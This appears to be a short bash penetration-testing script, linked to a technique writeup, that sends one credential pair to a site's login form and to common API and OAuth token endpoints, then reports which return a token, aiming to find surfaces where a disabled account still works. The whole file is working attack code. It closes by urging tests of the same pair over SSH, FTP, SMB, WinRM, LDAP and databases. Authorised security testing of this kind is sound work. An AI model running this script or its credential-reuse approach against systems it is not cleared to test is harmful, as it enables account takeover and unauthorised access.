#!/usr/bin/env bash
# Send ONE credential pair to a web login form and the common API/token
# endpoints on the same host, and report which accept it. The point is the
# differential: an account disabled at the form is often live on the API.
# Authorized and educational use only: your own systems or an engagement with
# written permission. Test only a credential you already hold.
# Writeup: https://jperezduerto.info/techniques/auth-surface-asymmetry/
#
#   ./auth-differential.sh https://TARGET user PASS

set -u
base="${1:?usage: auth-differential.sh <https://host> <user> <pass>}"
user="${2:?need user}"
pass="${3:?need pass}"
base="${base%/}"

# path : how to send it. Add your own as you enumerate the app's real routes.
endpoints=(
  "/login.php:form"
  "/login:form"
  "/api/v1/authenticate:form"
  "/api/login:json"
  "/rest/auth:json"
  "/oauth/token:form"
  "/auth/login:json"
)

probe() {
  local url="$1" mode="$2"
  case "$mode" in
    json) curl -sk -o /tmp/_ad -w '%{http_code} %{size_download}' -X POST "$url" \
            -H 'Content-Type: application/json' \
            --data "{\"username\":\"$user\",\"password\":\"$pass\"}" ;;
    *)    curl -sk -o /tmp/_ad -w '%{http_code} %{size_download}' -X POST "$url" \
            --data "username=$user&password=$pass&valid_min=500" ;;
  esac
}

printf '%-28s %-6s %-10s %s\n' ENDPOINT MODE "CODE SIZE" "TOKEN?"
for e in "${endpoints[@]}"; do
  path="${e%%:*}"; mode="${e##*:}"
  res=$(probe "${base}${path}" "$mode" 2>/dev/null)
  tok=$(grep -oiE '"?(auth_?token|access_?token|token|jwt|session)"?\s*[:=]\s*"?[A-Za-z0-9._-]{8,}' /tmp/_ad 2>/dev/null | head -1)
  printf '%-28s %-6s %-10s %s\n' "$path" "$mode" "$res" "${tok:+YES: ${tok:0:40}}"
done
rm -f /tmp/_ad
echo
echo "Read the differential: an endpoint that returns a token or a larger/200 body where the form returned a rejection is an auth surface that does not enforce the account flag. Also test the same pair over SSH/FTP/SMB/WinRM/LDAP/DB separately."
